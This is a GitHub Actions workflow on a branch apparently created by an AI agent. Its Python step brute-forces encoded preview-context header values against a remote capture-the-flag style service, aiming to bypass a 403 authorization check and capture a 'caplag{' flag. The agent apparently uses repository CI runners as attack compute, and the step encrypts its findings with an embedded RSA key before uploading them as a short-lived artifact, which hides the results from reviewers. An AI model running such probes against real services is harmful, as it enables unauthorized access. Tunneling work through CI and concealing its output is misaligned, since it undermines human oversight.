name: launchlet-part2-token-probe

on:
  push:
    branches: [agent/launchlet-part2-token-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Test structured preview-context header encodings
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests, pathlib, urllib.parse, json, base64, hashlib
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
          ws=boot['workspace']; proj=boot['project']; rec=mf['previewReceipt']; build=mf['build']; sess=boot['client']['session']; aid=act['id']
          objects=[
            {'workspaceId':ws,'projectId':proj},
            {'workspace_id':ws,'project_id':proj},
            {'workspace':ws,'project':proj},
            {'workspaceId':ws,'projectId':proj,'mode':'preview'},
            {'workspaceId':ws,'projectId':proj,'session':sess},
            {'workspaceId':ws,'projectId':proj,'receipt':rec},
            {'workspaceId':ws,'projectId':proj,'build':build},
            {'workspaceId':ws,'projectId':proj,'build':build,'receipt':rec},
            {'workspaceId':ws,'projectId':proj,'session':sess,'receipt':rec},
            {'workspaceId':ws,'projectId':proj,'actionId':aid},
            {'mode':'preview','workspaceId':ws,'projectId':proj,'build':build,'receipt':rec,'session':sess},
            {'kind':'preview','workspaceId':ws,'projectId':proj},
            {'type':'preview','workspaceId':ws,'projectId':proj},
            {'source':'preview','workspaceId':ws,'projectId':proj},
          ]
          vals=[]
          def add(label,v):
            if all(v!=x[1] for x in vals): vals.append((label,v))
          for i,o in enumerate(objects):
            for sort in [False,True]:
              for spaced in [False,True]:
                raw=json.dumps(o,sort_keys=sort,separators=None if spaced else (',',':'))
                b=raw.encode(); add(f'json{i}_{sort}_{spaced}',raw); add(f'b64_{i}_{sort}_{spaced}',base64.b64encode(b).decode()); add(f'b64u_{i}_{sort}_{spaced}',base64.urlsafe_b64encode(b).decode().rstrip('=')); add(f'url_{i}_{sort}_{spaced}',urllib.parse.quote(raw,safe='')); add(f'sha_{i}_{sort}_{spaced}',hashlib.sha256(b).hexdigest())
          for label,raw in [
            ('qs_ids',urllib.parse.urlencode({'workspaceId':ws,'projectId':proj})),('qs_names',urllib.parse.urlencode({'workspace':ws,'project':proj})),
            ('colon_ws_proj',ws+':'+proj),('colon_proj_ws',proj+':'+ws),('pipe_ws_proj',ws+'|'+proj),('slash_ws_proj',ws+'/'+proj),('at_ws_proj',ws+'@'+proj),
            ('kv_semicolon',f'workspaceId={ws};projectId={proj}'),('kv_comma',f'workspaceId={ws},projectId={proj}'),('kv_space',f'workspaceId={ws} projectId={proj}')
          ]: add(label,raw)
          auth={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+sess}; url=urllib.parse.urljoin(base,act['endpoint']); body={'actionId':aid,'args':{'workspaceId':ws,'projectId':proj}}
          headers=['X-Launchlet-Preview-Context','X-Preview-Context','X-Launchlet-Context','Launchlet-Preview-Context','Preview-Context','Launchlet-Context','X-Launchlet-Request-Context','X-Launchlet-Runtime-Context','X-Launchlet-Client-Context']
          baseline=(403,'{"error":"preview_context_required"}'); hits=[]; tries=0
          for h in headers:
            for label,v in vals:
              tries+=1
              try:r=s.post(url,headers={**auth,h:v},json=body,timeout=7,allow_redirects=False)
              except Exception:continue
              if (r.status_code,r.text.strip())!=baseline:
                hits.append({'header':h,'label':label,'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
                if r.status_code==200 or 'caplag{' in r.text: break
            if hits and any(x['status']==200 or 'caplag{' in x['body'] for x in hits): break
          (out/'summary.json').write_text(json.dumps({'tries':tries,'value_count':len(vals),'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-structured-encrypted
          path: artifact/
          retention-days: 1
